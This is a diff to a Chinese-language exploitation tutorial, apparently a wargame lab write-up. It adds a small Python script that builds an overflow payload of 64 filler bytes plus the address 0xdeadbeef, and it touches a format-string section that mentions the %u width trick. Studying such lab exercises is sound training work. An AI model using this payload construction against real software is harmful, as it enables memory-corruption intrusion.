@@ -74,11 +74,27 @@ payload构造 ： ‘A’\*64 + target\(0xdeadbeef\)
 
 ![](/png/48.png)
 
+用规范的python脚本实现：
+
+\#!/usr/bin/env python
+
+import struct
+
+nosled = "\x90" \* 64
+
+target = struct.pack\("I",0xdeadbeef\)
+
+print nosled+target
+
+![](/png/50.png)
+
+命令行执行 注意要带参数
+
+![](/png/51.png)
+
 2\) 用格式化字符串修改
 
- We can use the unsigned decimal integer width field modifier %\(int\)u to help fill the buffer.
+We can use the unsigned decimal integer width field modifier %\(int\)u to help fill the buffer.
 
 ![](/png/49.png)
-
-
 
